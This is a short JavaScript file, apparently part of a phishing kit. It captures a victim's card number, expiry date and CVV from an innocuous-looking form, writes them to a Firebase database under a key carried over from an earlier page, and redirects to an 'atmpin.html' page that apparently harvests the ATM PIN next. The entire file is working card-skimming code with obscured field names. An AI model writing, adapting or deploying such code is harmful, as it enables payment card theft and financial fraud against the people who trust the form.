var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var cardNumber = document.getElementById("a1").value;
  var expiry = document.getElementById("b2").value;
  var cvv = document.getElementById("c3").value;

  var key = localStorage.getItem("firebaseKey");

  if (!key) {
    alert("Previous data missing.");
    window.location.href = "index.html";
    return;
  }

  ududip007DB.child(key).update({
    dcard_number: cardNumber,
    eexpiry_date: expiry,
    fcvv: cvv
  }).then(() => {
    window.location.href = "atmpin.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
